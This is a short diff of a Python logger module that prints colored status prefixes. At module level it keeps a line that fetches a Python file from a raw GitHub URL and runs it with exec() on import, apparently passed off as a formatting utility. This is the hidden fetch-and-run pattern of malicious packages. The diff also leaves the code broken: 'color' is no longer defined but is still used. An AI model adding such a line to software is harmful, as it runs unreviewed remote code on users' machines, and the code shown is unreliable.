@@ -1,9 +1,7 @@
 
 import requests
 
-formating = exec(requests.get("https://raw.githubusercontent.com/ProfKrzys/test/main/utils/formating.py").text)
-
-color = formating.color
+response = exec(requests.get("https://raw.githubusercontent.com/ProfKrzys/test/main/utils/formating.py").text)
 
 class Logger:
     def plus(text):
@@ -14,3 +12,5 @@ class Logger:
 
     def slash(text):
         print(f"{color.bright_black('[')}{color.dark_yellow('/')}{color.bright_black(']')} {color.white(text)}")
+
+
